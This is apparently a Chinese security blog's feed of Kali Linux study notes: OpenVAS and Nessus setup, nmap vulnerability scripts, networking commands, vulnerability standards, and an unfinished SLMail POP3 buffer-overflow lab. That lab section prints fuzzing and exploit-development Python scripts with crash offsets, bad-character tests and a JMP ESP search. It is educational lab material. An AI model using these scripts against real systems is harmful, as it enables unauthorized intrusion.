      <content type="text"><![CDATA[0x00 OPENVAS 一切皆策略Openvas是开源的，是Nessus项目分支，用于管理目标系统的漏洞的同时也可以进行攻击渗透。Kali默认安装，但未配置和启动。 Openvas的更新很快，并且配置比较复杂，基于此，也许Openvas并不为大多数人所知。 0X01 Openvas配置不幸的是，好像Kali Rolling版本已经没有默认安装Openvas了，需要重新下载: 安装openvas1➜ ~ apt-get install openvas 然后开始配置Openvas1➜ ~ openvas-setup 检查安装结果1➜ ~ openvas-check-setup 查看当前账号1➜ ~ openvasmd --list-users 修改账号密码记住更新完openvas以后一定要记得记住那个密码！！！ 1➜ ~ openvas --user=admin --new-password=Password 升级Openvas1➜ ~ openvas-feed-update openvas开放的端口1➜ ~ netstat -pantu | grep 939 其中9390是openvas的manager端口号，9391是openvas第一个默认安装的第一个扫描器的端口号，9392是openvas的web登录界面。 但是有时openvas会加载失败，导致family与NVT加载失败，使用openvas-setup才可以从新打开。 0x02 openvas的web页面登录openvas web界面:https://127.0.0.1:9392值得注意的是，openvas不会随着kali自动启动，所以我们需要每次自行启动openvas服务: 1$: /usr/bin/openvas-start Extras-&gt;MySetting这里可以对我们的openvas进行设置。 0x03 OPENVAS 初体验使用openvas进行扫描操作之前需要配置扫描策略(Configuration)。 登录openvas界面后选择Configuration菜单下的Scan configs可以看到openvas已经默认集成了多种扫描策略: Discover: 只对目标系统进行发现扫描。 empty: 空策略，不进行任何操作。 Full and fast:全面的快速的扫描 Full and fast ulitimate:全面的快速的极限扫描 Full and very deep:全面的深度扫描 Full and very deep ultimate:全面的极限深度扫描 Host Discovery:主机发现 System Discovery:系统识别 通常情况下我们会选择Full and Fast策略，它的families类型会达到56，NTV数量可以达到40000多个。 当然也可以自定义扫描策略. 0x04 Openvas 自定义扫描策略 创建一个只针对windows的扫描策略选择菜单栏的星号，可以进行自定义的扫描策略。 进入Confiuration选项点击Scan configs后再点击菜单栏中的星号图标可进行New Scan Configuration操作。 然后设置好策略的名称，在Edit Network Vulnerability Test Families中\选择需要的family\类型，每一个family代表一种漏洞类型，该类型下会集成多个NVTS。 然后勾选Selext all NVTs选项为策略添加该families。 还注意到_Family旁有斜着(DYNAMIC)和横(STATIC)着的两个箭头，选择DYNAMIC意味着当openvas官方发布该Family下新的NVTS时，策略会自动添加新的NVTS__。 由于只是针对windows系统的扫描，所以我们会选择如下的Families: Brute force attacks:暴力破解漏洞，该family不仅仅对windows有效，linux同样适用。 Buffer overflow:缓存区溢出漏洞 Compiance Databse:数据库 Default Accpunts:默认账号 Default Service:默认服务 FTP: FInger abuses: Firewall: Gain a shell rmotely General Malware恶意软件 Nmap NSE：NAMP的恶意扫描脚本 Nmap NET NSE Peer-To-Peer Policy Port scanners Privilege escalation Production detetion RPC SMTP problems SNMP Service detection Settings Useless services Web Servers Web application abuses Windows Widows:Microsoft Bulletins 选择完毕以后Save Config,\回到主界面，可以发现多了一个window_Server_scanconfig的配置文件。 以后可以通过扳手图标对其进行编辑。 确定要扫描的Targets策略选择菜单栏Configuration\下的Targets\选项，然后点击星号按钮进行扫描目标策略配置。 配置好以后选择Creat Target进行保存。 配置端口扫描策略同样选择Configuration--&gt;Port List--&gt;星号(New Port List)添加需要扫描的端口号。 Schedule策略调度策略可以使用Task按Schedule中的规则去执行任务。比如在特定的时间点执行策略，或者每周执行一处策略。 Task策略建立Task策略可以自定义执行之前的所有策略。这次讲使用到菜单栏的Scan Management\选项下的Task。 最后回到Task Manager页面，点击执行按钮开始执行任务。 利用扫描器去扫描也许会得到很多的结果，但是我们该如何去验证这些结果的正确性？这个便是MSF所能做的了。 生成报告当扫描完成以后可以讲扫描结果进行特定格式的导出，以方便进行阅读和分析。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[NESSUS]]></title>
      <url>%2F2016%2F06%2F27%2FNESSUS%2F</url>
      <content type="text"><![CDATA[0X00 前言OPENVAS是免费开源的，所以对于用户的是使用体验便不会太尽如人意了。那么与此对应的便是收费版本的NESSUS了，当然NESSUS也有免费版的，而且就弱点扫描这一块来说，NESSUS的商业版和免费版的功能是一样的。 首先进入NESSUS官网下载kali.deb安装包:http://www.tenable.com/products/nessus/select-your-operating-system#tos 0x01 NESSUS的安装安装完成以后得到如下界面: 12- You can start Nessus by typing /etc/init.d/nessusd start- Then go to https://jack:8834/ to configure your scanner 首先启动NESSS: 1234➜ /etc/init.d/nessusd startStarting Nessus : .➜ /etc/init.d/nessusd statusNessus is running 然后打开nessus的本地网站:https://jack:8834/,填写账号和密码，然后会提示你输入激活码，这时可以进入这个网站:http://tenable.com/products/nessus-home 去获得激活码。 最后得到激活码，开始安装nessus，此过程会比较漫长。。。。 NESSUS的安装目录是在:/opt/nessus/下的。 0x02 NESSUS的使用等待NESSUS安装完成以后通过访问本地web页面登录nessus:http://127.0.0.01/8834 Scanner Templates 扫描模板nessus已经集成了一些扫描模板，UPGRADE是仅仅对于商业版才能使用的。 Aavanced Scan 高级扫描进入Adacande Scan制定一个扫描策略。 Basic Network Scan这是一个主机扫描，可以任何操作系统的主机进行扫描。 Bash Shellshocks Detection检查破壳应用的一个扫描，破壳是一个linux系统上的漏洞，由于系统环境变量造成的。 GHOST Detection 幽灵病毒关于black c最底层的一个漏洞 Web Application Tests网页应用层扫描，NESSUS针对网页应用层的扫描是十分有限的。 Windows针对windows恶意程序扫描。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[漏洞扫描]]></title>
      <url>%2F2016%2F06%2F23%2FNMAP%E4%B9%8B%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[0x00 NMAP之漏洞扫描进入nmap的scripts文件夹下1234➜ scripts pwd/usr/share/nmap/scripts➜ scripts less script.db| wc -l527 可以看到已经有500多个脚本文件了。 12➜ scripts less script.db| grep vuln | wc -l83 其中有83个是和漏洞攻击/监测有关的。 smb-vuln-ms 10-061.nse该漏洞是Stuxnet蠕虫利用的4个0day之一，既是著名的震网病毒，美国为了攻击伊朗的核设施而发动的人类历史上第一个数字核武器。 其主要是利用LAMMAN API去枚举目标系统的共享打印机，通过低版本的windows，Print Spooler权限配置不当不当，使得印请求可在系统目录创建文件，执行任意代码。 所以10-061首先会去探测目标是否有共享打印机，然后去探测目标系统共享打印机的名称，最后再去进行攻击。 但若是该脚本没有发现共享打印机呢？那么我们还可以利用Kali中的smb-enum-shares.nse脚本去枚举目标系统中的共享打印机。但是存在一种情况是有时需要知道目标的账号和密码才能实现枚举:smb-enum-shares.nse –script-args=smbuser=admin,smbpassword=pass。利用该脚本去发现目标是否存在共享打印机，然后再使用10-061去执行特意功能。 其具体使用方式是连接目标系统的445端口。 对目标进行共享枚举检查:123➜ scripts nmap -445 --script=smb-enum-shares.nse 192.168.1.102 //登陆目标主机以提高探测精确度： //--script-args=smbuser=admin,smbpassword=123]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[常用网络指令]]></title>
      <url>%2F2016%2F06%2F18%2F%E7%AC%AC%E4%BA%94%E7%AB%A0-%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8C%87%E4%BB%A4%2F</url>
      <content type="text"><![CDATA[ifconfig:查询，设置网卡与ip相关参数默认不加参数表示观察所有网络接口12345678910root@jack:~# ifconfigeth0 Link encap:Ethernet HWaddr 3c:97:0e:80:50:72 lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1wlan0 Link encap:Ethernet HWaddr 54:16:71:a6:a8:39 inet addr:100.320.140.34 Bcast:442.230.310.315 Mask:255.255.255.240 inet6 addr: fe80::a617:31ff:fef6:d859/64 Scope:Lin RX bytes:2318382 (2.2 MiB) TX bytes:1054948 (1.0 MiB) 给予eth0一个IP：12root@jack:~# ifconfig eth0 192.168.1.23#如不加其他参数，系统会自动依照该IP所在class范围计算出netmask和network，#broadcast等参数 添加上其他的参数同时设定MTU的值12root@jack:~# ifconfig eth0 192.168.1.23\&gt; netmask 255.255.255.0 mtu 8000 在一张网卡上设置多个ip1root@jack:~# ifconfig eth0:0 192.168.0.193 启动关闭网卡1root@jack:~# ifconfig eth0/wlan0 down/up 恢复系统默认配置，重启网络1root@jack:~# /etc/init.d/network restart 路由修改 route单纯的观察路由12345root@jack:~# route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface0.0.0.0 172.20.10.1 0.0.0.0 UG 1024 0 0 wlan0172.20.10.0 0.0.0.0 255.255.255.240 U 0 0 0 wlan0 Destination, Genmask：这两个就是分别是 network 与netmaskGateway：该网域是通过哪个 gateway 连接出去的Flags：总共有多个旗标，代表的意义如下：U(route is up):该路由是启动的G(use gateway):需要通过外部的主机(gateway)来传递封包 增加一个路由12root@jack:~# route add -net 192.168.100.1\&gt; netmask 255.255.255.0 dev eth0 删除一个路由12root@jack:~# route del -net 192.168.100.1\&gt; netmask 255.255.255.0 dev eth0 增加一个默认路由1root@jack:~# route add default gw 192.158.1.250 网络参数综合指令 ipip只能在功能上可以说是ifconfig，ifup，ifdown，route的众合指令集，Ip指令后续在了解。pass 无线网络 iwlist,wiconfig iwlist: 利用无线网卡进行无线 AP 的探测与取得相关的数据 iwconfig: 设定无线网卡的相关参数 使用DHCP获得Ip:dhclient如果我们的IP是局域网内通过DHCP服务器自动分配的，那么可以直接使用dhclient命令，为网卡取得ip 1root@jack:~# dhclient eth0 0x01 网络排查指令 pingping主要用来探测两个主机之间的连接状态。 每间隔1秒发送三个包检查百度主机是否存在1root@jack:~# ping -W1 -c3 www.baidu.com traceroute追踪两部主机之间通过的各个节点 (node) 通讯状况。 使用tcp协议侦测本机到 yahoo 去的各节点联机状态1root@jack:~# traceroute -w 1 -n -T tw.yahoo.com netstat 查看本机网络端口列出目前已经启动的网络服务1root@jack:~# netstat - tulnp 检查本机的80端口是否监听1root@jack:~# netstat -l localhost:80 host查询某个主机名对应的IP1root@jack:~# host www.baidu.com nslookup与host一样的，同时host与nslooup都可以使用dig命令来代替了 0x02 远程连接 telent尝试telent baidu.com1root@jack:~# telent www.baidu.com 80 使用telent检查本机端口是否正常开启1root@jack:~# telent localhost:80 0x03 文字接口网页浏览器 links:文字接口浏览器links查看本机上的html文件1root@jack:~# links /usr/doc/html/index.html 通过links+dump参数将sina.com的网页内容整个抓取下来存储 1root@jack:~# links -dump http://sina.com &gt; sina.html wget:文字接口下载器wget网页数据的取得1root@jack:~# wget 网站网址 wget不必透过浏览器，只要知道网址后，立即可以进行档案的下载， 又快速又方便，还可以透过 proxy 来下载，透过修改 /etc/wgetrc 来设定你的代理服务器： 12345678root@jack:~# vim /etc/wgetrc# You can set the default proxies for Wget to use for http, https, and ftp.# They will override the value in the environment.#https_proxy = http://proxy.yoyodyne.com:18023/#http_proxy = http://proxy.yoyodyne.com:18023/#ftp_proxy = http://proxy.yoyodyne.com:18023/# If you do not want to use proxy at all, set this to off.#use_proxy = on 0x04 特殊工具]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[非加密类型协议分析]]></title>
      <url>%2F2016%2F06%2F15%2F%E9%9D%9E%E5%8A%A0%E5%AF%86%E7%B1%BB%E5%9E%8B%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[0x00抓包分析是非常考验个人对各种网络协议的理解的，这些都是需要经过历练的，我们需要在不断的摸索和认知中提高自己的网络分析能力。 再计算机的世界中，只有0和1两数字，同时0和1也构建了整个网络，数据流里传输的只有0和1，所以通过抓包得到的也只有0和1，显然人类不可能通过一连串的0和1窥探计算机的一切。 那么，抓包软件应运而生(显然，对于加密类型的协议：https,ssh2.0等等，抓包软件基本就是摆设了)。转包软件可以将0和1转换成为人类可识别的语言。 ###当每天面对几百G的网络流量，如何应对突如其来的流浪分析。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[缓冲区溢出]]></title>
      <url>%2F2016%2F06%2F15%2F%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%2BPop3%2BFuzzing%2F</url>
      <content type="text"><![CDATA[0x00 缓冲区缓冲区其实是内存中的一个片段，用于存放内存中的数据。我们知道程序是动态的，会根据不同的输入，参数等等而产生不同的计算结果，因为计算机程序的应用，使得整个人类的计算能力得到了上帝的技能，但是这也成为了程序的致命弱点，它无法判断哪些输入是有有害的，哪些输入会导致内存溢出或者计算机崩溃。 程序漏洞其本质上是数据与代码边界的混淆不清，从而让程序执行了一些不可预测的指令。 缓冲区溢出当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被“撑暴”,从而覆盖了相邻内存区域的数据; 成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务器控制权等后果. 如何发现漏洞?目前比较主流的发现漏洞的方法有三种方式 :源码审计 ，逆向工程，模糊测试。 0x01 Windows 缓冲区溢出目标环境:SLMail 5.50Mail Server(OS XP;ip:192.168.1.12)动态调试工具:ImmunityDebugger测试脚本:mona.py操作环境:OS:Kali;ip:192.168.1.11ImmunityDebugger 可以调用 py脚本，并且其自动化程序更高。 当 SLMail 邮件服务安装完成以后 netstat -nao 查看端口检测是否安装成功.可以发现，25,110,180等端口都已经开放。 Ok,服务器软件安装成功以后便可以安装 Debugger 工具了。 对于 mona.py 脚本程序我们可以在 Github 中获得。 一切安装完成以后，将 mona.py 脚本导入到 Immunity Debugger\PyCommands 目录就好了。 本次实验并不适合在 XP 以上的 window中环境中测试，因为 SLMail 是个很早的软件了，此外从 win7 开始微软便加入了系统级别的 DEP 和 ASLR 防护。 DEP: 结合 CPU 特性，通过软硬件的协同，阻止代码从数据页被执行。这样即使代码存在漏洞，也不会那么容易被直接利用。奈何，黑客的存在就是为了打破规则的，现在 DEP 也被绕的出不多算是个摆设了。所以，微软接着又提出来 ASLR 返回机制。 ASLR: 很久以前，代码在 os 内存中执行的地址是固定，我们甚至可以直接将某个 shell 打到一个指定的内存地址中去执行代码。这种基于静态的内存分配机制很容易被利用。所以，基于动态的，随机内存地址加载执行程序和 DLL内存分配机制便被广泛应用起来。 0x02 POP3网络协议何止一种，当我遇到不熟悉的网络协议的时候，可以使用 wireshark 去抓包，去分析，了解这个我们原本不熟悉的协议。当然我们现在已经知道 SLMali 中 POP3 协议 的 PASS 命令是存在的，并且存在缓存区溢出的。 使用 pass 对 XP SLMail 100 端口发送数据。但是要发生缓冲区溢出，意味着我们需要对其发送大量的数据，而为了搞清楚到底多大的数据请求会导致其缓冲区溢出，我们需要不断的迭代累加的去发起请求，以次获得最接近的那个临界值，那么，现在从一个简单的 02.py 脚本开始 02.py1234567891011121314151617181920#!/usr/bin/pythonimport socketbuffer = [&quot;A&quot;]counter = 100while len(buffer) &lt;= 50: buffer.append(&quot;A&quot; *counter) counter = counter + 200for string in buffer: print &quot;Fuzzing PASS with %s bytes&quot; % len(string) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect = s.connect((&apos;192.168.1.12&apos;, 110)) s.recv(1024) s.send(&apos;USER test&apos;+ &apos;\r\n&apos;) s.recv(1024) s.send(&apos;PASS &apos; + string + &apos;\r\n&apos;) s.send(&apos;QUIT\r\n&apos;) s.close() 当然，如果我们已经发送了大量的弹出数据但是依旧没有发生溢出，这时我们可以放弃对这个参数的模糊测试了。 Debugger数据一旦发送，便可以打开 XP 中的 Debugger 工具观察服务器状态。 我们可在 file&gt;open 直接打开一个 .exe 文件进行静态调试，也可以 file&gt;Attach 选择一个正在运行的程序进行动态调试。 Attach 我们选择 Attach 并对 SLMail 这个程序进行 Attach。但一个正在运行的程序被 Attach 后便会暂停运行，为了观察我们需要让其继续运行起来。 正式发起数据请求现在我们通过 Kali 运行 02.py 脚本对其发送大量数据 在右侧的 Register 中，EIP 寄存器中所存放的的下一条指令的地址。通过 EIP 寄存器我们做蛮多有意思的事情，就是当发现缓存区溢出以后如去利用。 运行 02.py 脚本程序，我们每次递增 100 个字节向目标服务器发起请求数据，可以看到当发送的字节数达到 3000 bytes 时，程序崩溃了，说明 PASS 指令确实存在缓冲区溢出，而为了得到更加精确的崩溃临界点，我们有了 03.py 脚本程序。 03.py123456789101112131415#!/usr/bin/pythonimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)buffer = &quot;A&quot; * 2700try: print &quot;\nSending evil buffer...&quot; s.connect(&apos;192.168.1.12&quot;, 110) data = s.recv(1024) s.send(&apos;USER admin&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!.&quot;except: print &quot;Could not connect to POP3&quot; 通过，03.py 脚本首先发送了 2700 个 “A”,发现程序也崩溃了，于是尝试减少发送的数据量为 2600 个 “A”，发现程序还是崩溃了，但是与 2700 个字符串导致的崩溃不同，2600 个 “A” 并没有完全覆盖 EIP 寄存器，这意味着我们得到了一个区间，在 2700~2600之间，我们离潘多拉的魔盒又近了一步，现在，我们有两种方式去尝试打开盒子，一个是二分法，不断的细分这个区间的值，虽然这种方式有点笨，但是终归是可以找到真理的。或者，可以试试唯一字符串的方式。 Python 中自带了一个能生成唯一字符串的脚本程序 pattern_create.rb 12./usr/shaer/metasploit-framework/tools/exploit/pattern_create.rb 2700// 生成2700个唯一字符串 &#123;str&#125; 我们将 {str} 字符串替换掉 03.py 中的 “A”，得到 04.py： 04.py123456789101112131415#!/usr/bin/pythonimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)buffer = &quot;str&quot;try: print &quot;\nSending evil buffer...&quot; s.connect(&apos;192.168.1.12&quot;, 110) data = s.recv(1024) s.send(&apos;USER admin&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!.&quot;except: print &quot;Could not connect to POP3&quot; 再次发送数据，程序崩溃，得到 EIP 寄存器中的数值 39 69 44 38计算机和人不一样，它在寄存器中所存储的数据的顺序是从高位向地位的，所以转换为人类的可读顺序就是 38 44 69 39，然后t通过对照 ASCII 码表，我们可以得到其确切的信息。 12十六进制:38 44 69 39ASCII:8 D i 9 进一步执行 exploit 目录下的 pattern_offset.rb 文件便可以得到 39 69 44 38 在唯一字符串中的精准偏移量: 12root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb 39694438[*] Exact match at offset 2606 我们得到了溢出的位置，即是程序是从 2606 这个位置开始崩溃的，但是为了再次验证这个结果可靠性，我们再次对 03.py 脚本进行修改，让其先发送 2606 个 A ，再发送四个 B，接着发送20个 C，然后去观察 Dubugger 调试工具中的 EIP 寄存器是否会被写入4个 B? 05.py123456789101112131415#!/usr/bin/pythonimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)buffer = &quot;A&quot;*2606 + &quot;B&quot;*4 + &quot;C&quot;*20try: print &quot;\nSending evil buffer...&quot; s.connect(&apos;192.168.1.12&quot;, 110) data = s.recv(1024) s.send(&apos;USER admin&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!.&quot;except: print &quot;Could not connect to POP3&quot; 我们发现，得到结果和我们预想的一样，程序崩溃后，EIP 被填满了 424242 [ B 对应的 ASCII 码是 42]，同时 ESP 被填满了20个 C,如此，我们知道了，程序确是 2606 这个位置发生了溢出，而当溢出后我们便可以从这位置开始写入任意 指令 了。 潘多拉的魔盒已开，我要进去看看另一个世界的样子 0x03 模糊测试(Fuzzing) 思路我们已经得到了 EIP 的溢出地址，而下一步我们需要将 EIP 修改为 shellcode 代码的内存地址，从而将 shellcode 写入到该地址空间，当程序读取 EIP 寄存器数值时，将跳转到 shellcode 代码段并执行。 寻找可存放 shellcode 的内存空间通过之前的操作，我们发现原来 ESP 寄存器也是可以被修改的，那么，现在尝试将 ESP 作为 shellcode 的存放空间。 首先，假设目标的内存中可以存放的字符总数是 3500 个，去掉 EIP 寄存器中的 2606+4 个，理论上，ESP 中将会存放 3500-2606+4 个字符,由此，便可以判断 ESP 的容量大小是否可以作为 shellcode 的存放空间。 可在 03.py 脚本的基础上得到 05.py(其实，除了 buffer 不一样， 03.py, 04.py, 05.py, 06.py都是同一个脚本程序) 123456789101112131415#!/usr/bin/pythonimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)buffer = &quot;A&quot;*2606 + &quot;B&quot;*4 + &quot;C&quot;*(3500 - 2606 -4)try: print &quot;\nSending evil buffer...&quot; s.connect(&apos;192.168.1.12&quot;, 110) data = s.recv(1024) s.send(&apos;USER admin&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!.&quot;except: print &quot;Could not connect to POP3&quot; 同样，我们再次重启 SLMail 服务，并打开 Debugger 调试工具，运行脚本程序。打开 Debugger EIP 的内存地址被精准的修改为 42424242，而 ESP 被填满了很多的 “C”，对 ESP 右键选择 Follow In Dump ，通过界面中的 Address 栏， 同时为了观察的方便，将Hex调整为 16bytes 。 发现最开始出现 “C” 的地址为 EF7A154 ，而 “C” 的结束位置是EF7A2F4，通过计算得到其差值为 1A0，装换为十进制为 416。 即是 ESP 寄存器可以存放 416 bytes 的数据，可以满足一条 shellcode 所需的存放空间。 似乎，只需将 shellcode 放进去就好了。。。是，想象是美好的，二进制的世界是残酷的，我们遇到的第一个问题就是 坏字符。 坏字符不同类型的程序，协议，漏洞，会将某些字符认为是坏字符，一旦在内存中出现这些字符，将会导致程序的崩溃或者锁死，或者本过滤，因为这些字符通常有固定的用途。 比如 0x00 空子符,0x0D 回车，但这只是基于我们已知的认知，是否其 ESP 中还存在其他坏字符呢？而如果要对 ESP 注入 shellcode ，又需要先将 ESP 中的坏字符全部挑选出来。 此时，我们需要用到脚本 07.py 07.py基本原理:在 ASCII 中一个字符表示一个字节，而一个字节代表一个 8位的二进制数，从[00000000 ~ 11111111] 一共可以表示 256 个可能的字符。 那么，可以发送 0x00 ~ 0xff 共 256 个字符进行测试，以此找出所有的坏字符。 1234567891011121314151617181920#!/usr/bin/pythonimport socketbadChars = &#123;&quot;---&quot;&quot;---&quot;&quot;---&quot;&#125;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)buffer = &quot;A&quot;*2606 + &quot;B&quot;*4 + badCharstry: print &quot;\nSending evil buffer...&quot; s.connect(&apos;192.168.1.12&quot;, 110) data = s.recv(1024) s.send(&apos;USER admin&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!.&quot;except: print &quot;Could not connect to POP3&quot; 通过对 Dubugger 的观察(即是当程序崩溃是，Address 中出现不连续的字符序列，即可找出坏字符)，我们一共找出了三个坏字符0x00, 0x0A, 0x0D。 0x04 数据重定向我们已经找到了所有的坏字符，现在可以开始进行数据重定向了，即只要将 ESP 的地址替换为 EIP 的值就可以了。但是问题有又来了，计算机 ESP 寄存器的地址是随机变化的，每次开关机，每次运行 SLMail 程序都会随机变化。 面对这个问题，我们的思路如下: 首先在内存中寻找内存地址固定的系统模块。 其次在模块中寻找 JMP ESP 指令的地址，再由该指令间接跳转到 ESP，从而执行 shellcode。 然后使用 mona.py 脚本识别内存模块，搜索 return address 是 JMP ESP 的指令模块。 再寻找无 DEP,ALSR 保护的内存地址。 最后，确保内存地址中不包含坏字符。 这也是进行缓冲区溢出遇到目标地址随机变化时常用的思路，找到一个内存地址固定不变的系统模块中 JMP ESP 指令所在的地址，通过该地址跳转到 ESP，以不变应万变。 如何找?mona.py 自带的脚本程序可以很好的帮助我们去发现系统中的 JMP ESP 地址。 在 Immunity Debugger 中输入 !mona modules ,可以得到 SMLMail 程序运行时所调用的系统模块。 找到 Rebase ，SafeSEH, ASLR,NXCompat 为 False ，而 OS DLL 为 True 的系统模块。(假如该模块的名称是 USER32.dll) nasm_shell.rbKali 中的 nasm_shell.rb 脚本可以将汇编语言转换为二进制。运行该脚本,将指令 jmp esp 转换为二进制: 123root@kali:/usr/share/metasploit-framework/tools/exploit# ./nasm_shell.rb nasm &gt; jmp esp00000000 FFE4 jmp esp 如上，我们得到了 jmp esp 指令的二进制表示为 FFE4,回到 Debugger 调试工具,使用 !mona find -s &quot;\xff\xe4 -m UERSER32.dll&quot;，去查找 openc32.dll 中是否存在 jmp esp 指令。 未完待续。。。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[思维初步]]></title>
      <url>%2F2016%2F06%2F15%2F%E6%80%9D%E7%BB%B4%E5%88%9D%E6%AD%A5%2F</url>
      <content type="text"><![CDATA[如果一个目标系统实施了强安全措施，即对方安装了所有补丁，无任何已知漏洞，无应用层漏洞，攻击面最小化，即是不开一切可有可无的端口等等，可以说毫无缝隙，那么此时是否就无计可施？ 其实最大的不安全因素永远人类自己，技术反而不那么重要，此时，社会工程学将发挥无法抗拒的力量。 离线密码破解-oclhashcat]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[漏洞扫描基本概念]]></title>
      <url>%2F2016%2F06%2F15%2F%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%2F</url>
      <content type="text"><![CDATA[通过之前的扫描我们可以知道目标主机的一些基本信息，然后我们可以基于这些个基本信息去进一步的发现目标是否存在漏洞，当然这种方式虽然可行，但是效率太低。 对于这方面，kali的提供了一个漏洞集成网站:https://www.exploit-db.com/ searchsploit同时kali系统也集成了searchsploit命令，该命令可以查询到eploit-db网站中所有的漏洞信息。 123456➜ ~ searchsploit tomcat--------------------------------------------- ---------------------------------- Exploit Title | Path | (/usr/share/exploitdb/platforms)--------------------------------------------- ----------------------------------Apache Tomcat &lt; 5.5.17 - Remote Directory Li | ./multiple/remote/2061.txt 由此也可以知道searchsploit的文档库的位置为:/usr/share/exploit/platforms中 然后我们只需要对其中的脚本只进行简单的修改就可以加以利用了。 SandiSandi将会以图形化的界面对exploit-db库中结果进行显示。 0x01 漏洞基本概念 CVSS(Common Vulnerability Scoring System)CVSS是通用的漏洞评分系统，它是工业标准，用于描述安全漏洞严重程度的统一评分方案。 CVSS使用Metric对弱电进行了分类: Basic Metric 基础的恒定不变的弱点权重 Temporal Metric 依赖时间因素的弱点权重 Enviromental Metric 利用弱点的环境要求和实施难度的权重 CVSS是安全内容自动化协议(SCAP)的一部分。通常CVSS与CVE一同由美国国家漏洞库(NVD)发布并保持数据的更新。 CVSS的评分范围是：0-10。10是最高等级，不同机构按CVSS分值定义威胁的中，高，低威胁级别，CVSS是工业标准，但是威胁等级级别不是。 CVE(Common Vulnerabilities and Exposures)CVE是已公开的信息安全漏洞字典，同时也是统一的漏洞编号标准。因为CVE的存在，使得漏洞的世界秩序变得清晰可辨。 当发现一个漏洞后，CAN负责指定CVE ID，然后发布到CVE LIst中:CVE-2008-4250，然后MITRE公司负责对内容进行编辑维护。 同时有的厂商也会有自己的CVE标准，比如微软的MS漏洞编号，MSKB为补丁编号。不同组织不同机构也许会有不同的CVE标准。 OVAL(Open Vulnerability and Assessment Language)描述漏洞检测方法的机器可识别语言。会以xml的格式进行发布。它是一个技术性的描述。它详细的描述了漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作。 CEE描述软件配置缺陷的一种标准格式。在信息安全风险评估中，配置缺陷的检测是一项重要内容，使用CCE可以让配置缺陷以标准的方式展现出来，便于配置缺陷评估的可量化操作。 CPE(Common Product Enumeration)信息技术产品，系统，软件包的结构化命名规范，分类命名标准。 CWE(Common Weakness Enumeration)常见漏洞类型的字典，描述不同类型漏洞的特征，不同于OVAL，CWE只是一个大体上的分类而已，不会去具体的打分（访问控制，信息泄露，拒绝服务）。 SCAP(Security Content Automation Protocol)SCAP是一个集合了多种安全标准的框架，它共有六个子元素:CVE,OVAL,CCE,CPE,CVSS,XCCDF。其目的是以标准的方法展示和操作安全数据。有NIST负责维护。 框架是个很有效率的东西，美国人民很擅长做框架的东西，因为一般只要完成了框架里所要求的事情，基本上就很规范了。所以，SCAP是当前美国比较成熟的一套信息安全评估标准体系，其标准化，自动化的思想对信息安全行业产生了深远的影响。 SCAP主要解决三个问题: 实现高层政策法规等到底层实施的落地。 将信息安全所涉及的各个要素标准化。 将复杂的系统配置核查工作自动化。 由于SCAP太完美，太细致啦，所以太复杂了，目前这个星球上完全安装按照SCAP标准去干的，只有NVD(National Vulnerabiliy Database:美国国家漏洞管理标准数据)一家。 NVD:https://nvd.nist.gov/ nvd的CheckList是很好用的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[NMAP]]></title>
      <url>%2F2016%2F06%2F13%2FNMAP%2F</url>
      <content type="text"><![CDATA[0x00 NMAP常用参数介绍 0x01 TARGET SPECIFICATION 目标发现-iL 添加扫描待ip列表文件-iR 随机选择目标不用指定目标ip，nmap对自动对全球的ip随机选择100个进行扫描 1root@kali:~# nmap -iR 100 -p100 –exclude 排除扫描当想要对某个ip地址段进行扫描，但是并不扫描其中特定的一些ip 1root@kali:~# nmap 192.168.1.0/24 --exclude 192.168.1.1-100 –excludefile从文件列表中排除不需要扫描的ip 0x02 HOST DISCOVERY 主机发现-sn 端口扫描Ping Scan - disable port scan -Pn 完全扫描Treat all hosts as online – skip host discovery通常用于扫描防火墙 -PS/PA/PU/PY[portlist] 协议扫描TCP SYN/ACK, UDP or SCTP discovery to given ports基于何种协议去进行扫描 -PO[protocol list] 使用ip协议扫描IP Protocol Ping -n/-R Never do DNS resolution/Always resolve [default: sometimes] -n：不进行nds解析 -R：对其进行反向解析 –dns-servers 更换DNS服务器: Specify custom DNS servers更换系统默认DNS服务器，以得到不同的扫描结果 1root@kali:~# nmap --dns-servers 8.8.8.8 www.sina.com –traceroute 路由追踪Trace hop path to each host基本等同于traceroute命令 1root@kali:~# nmap www.baidu.com --traceroute -p80 0x03 